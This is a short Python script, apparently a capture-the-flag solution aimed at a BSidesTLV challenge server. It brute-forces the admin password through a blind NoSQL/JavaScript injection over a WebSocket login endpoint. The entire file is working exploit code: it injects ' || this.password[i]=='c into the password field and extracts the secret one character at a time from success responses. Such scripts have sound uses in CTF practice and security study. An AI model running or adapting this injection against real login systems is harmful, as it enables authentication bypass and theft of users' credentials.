import string
from websocket import create_connection

def brute_force_pw(i):
  strings = string.printable
  for chr in strings:
    password = "' || this.password[%d]=='%s" % (i, chr)
    data = "{\"username\": \"admin\", \"password\":\"%s\"}" % password
    ws.send(data)
    r = ws.recv()
    if b"Success!" in r:
      return chr
    
ws = create_connection("ws://challenges.bsidestlv.com:8000/login")


response = ""
for i in range(0,30):
  result = brute_force_pw(i)
  response += str(result)
  print(response)
  if result == '}':
    break

print(response)

ws.close()